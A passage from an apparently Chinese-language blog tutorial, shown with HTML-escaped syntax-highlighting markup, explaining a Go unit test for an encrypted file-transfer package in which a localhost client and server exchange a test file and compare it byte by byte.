transmit_test.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; client_test(t *testing.T) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	time.Sleep(time.Second)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	cconn, err := net.Dial(&lt;span class=&quot;string&quot;&gt;&quot;tcp&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;127.0.0.1:10086&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;ERROR: Error dialing&quot;&lt;/span&gt;, err.Error())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;defer&lt;/span&gt; cconn.Close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	file, err := os.OpenFile(test_out_filename,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		os.O_WRONLY|os.O_CREATE|os.O_TRUNC, &lt;span class=&quot;number&quot;&gt;0666&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;ERROR: Cannot Open TestOutFile&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;defer&lt;/span&gt; file.Close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fileWriter := bufio.NewWriter(file)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ts := NewTransmitter(cconn, BUFSIZE, []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(pass))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ts.RecvToWriter(fileWriter)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	recvB, err := ts.RecvBytes()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;ERROR: Cannot receive bytes&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;(recvB) != test_string &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;ERROR: Receive bytes error&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ts.Destroy()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;服务器函数（测试函数主线程）&quot;&gt;&lt;a href=&quot;#服务器函数（测试函数主线程）&quot; class=&quot;headerlink&quot; title=&quot;服务器函数（测试函数主线程）&quot;&gt;&lt;/a&gt;服务器函数（测试函数主线程）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;真正的测试函数包含了服务器和客户端的启动，下面简单解释测试函数的流程：&lt;ul&gt;
&lt;li&gt;打开要传输的文件，通过函数 &lt;code&gt;GetFileSize&lt;/code&gt; 获取文件长度；&lt;/li&gt;
&lt;li&gt;监听 &lt;code&gt;127.0.0.1:10086&lt;/code&gt; 端口；&lt;/li&gt;
&lt;li&gt;启动客户端；&lt;/li&gt;
&lt;li&gt;服务器接受客户端请求；&lt;/li&gt;
&lt;li&gt;服务器向客户端发送此前打开的文件内容；&lt;/li&gt;
&lt;li&gt;服务器发送 &lt;code&gt;test_string&lt;/code&gt; 的内容；&lt;/li&gt;
&lt;li&gt;至此传输结束，测试函数开始比对文件 &lt;code&gt;test_in_filename&lt;/code&gt; 和 &lt;code&gt;test_out_filename&lt;/code&gt;，如果无误则退出，否则调用 &lt;code&gt;t.Errorf()&lt;/code&gt; 报告错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// transmit_test.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; TestTransmission(t *testing.T) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	file, err := os.Open(test_in_filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;Transmit: Cannot Open TestInFile&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;defer&lt;/span&gt; file.Close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fileReader := bufio.NewReader(file)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	totalFileLength, err := GetFileSize(test_in_filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;Transmit: GetFileSize function failed&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// test server&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	listener, err := net.Listen(&lt;span class=&quot;string&quot;&gt;&quot;tcp&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;127.0.0.1:10086&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;test server starting with an error, break down...&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;defer&lt;/span&gt; listener.Close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;go&lt;/span&gt; client_test(t)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	sconn, err := listener.Accept()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;Error accepting&quot;&lt;/span&gt;, err.Error())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fmt.Println(&lt;span class=&quot;string&quot;&gt;&quot;Rececive connection request from&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		sconn.RemoteAddr().String())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	tr := NewTransmitter(sconn, BUFSIZE, []&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(pass))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	tr.SendFromReader(fileReader, &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;(totalFileLength))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	tr.SendBytes([]&lt;span class=&quot;typename&quot;&gt;byte&lt;/span&gt;(test_string))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	time.Sleep(time.Second * &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// verify received&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	vfile, err := os.Open(test_out_filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;Transmit: Cannot Open TestOutFile&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;defer&lt;/span&gt; vfile.Close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	rfile, err := os.Open(test_in_filename)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;Transmit: Cannot Open TestOutFile&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;defer&lt;/span&gt; rfile.Close()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	vfileReader := bufio.NewReader(vfile)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	rfileReader := bufio.NewReader(rfile)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		rbyte, err1 := rfileReader.ReadByte()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		vbyte, err2 := vfileReader.ReadByte()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err1 != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;amp;&amp;amp; err2 != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; || err2 != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; || rbyte != vbyte &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			t.Errorf(&lt;span class=&quot;string&quot;&gt;&quot;Transmit: Received File Is Not Same With Origin File&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;代码中用到的 &lt;code&gt;GetFileSize&lt;/code&gt; 可以放到此前的 &lt;code&gt;transmit.go&lt;/code&gt; 中，作为一个可复用的函数：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// transmit.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;func&lt;/span&gt; GetFileSize(path &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt;) (size &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt;, err error) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fileInfo, err := os.Stat(path)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; err != &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; -&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, err&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fileSize := fileInfo.Size()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fileSize, &lt;span class=&quot;constant&quot;&gt;nil&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;全局变量指定&quot;&gt;&lt;a href=&quot;#全局变量指定&quot; class=&quot;headerlink&quot; title=&quot;全局变量指定&quot;&gt;&lt;/a&gt;全局变量指定&lt;/h2&gt;&lt;p&gt;上面代码中用到的几个全局变量和导入的包声明如下：&lt;/p&gt;
&lt;figure class=&quot;highlight golang&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// transmit_test.go&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;package&lt;/span&gt; transmit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;bufio&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;fmt&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;net&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;os&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;testing&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;string&quot;&gt;&quot;time&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; BUFSIZE &lt;span class=&quot;typename&quot;&gt;int64&lt;/span&gt; = &lt;span class=&quot;number&quot;&gt;4096&lt;/span&gt; * &lt;span class=&quot;number&quot;&gt;1024&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; pass &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;1234567890123456&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; test_in_filename &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;test_in.exe&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; test_out_filename &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;test_out.exe&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; test_string &lt;span class=&quot;typename&quot;&gt;string&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;helloworld&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
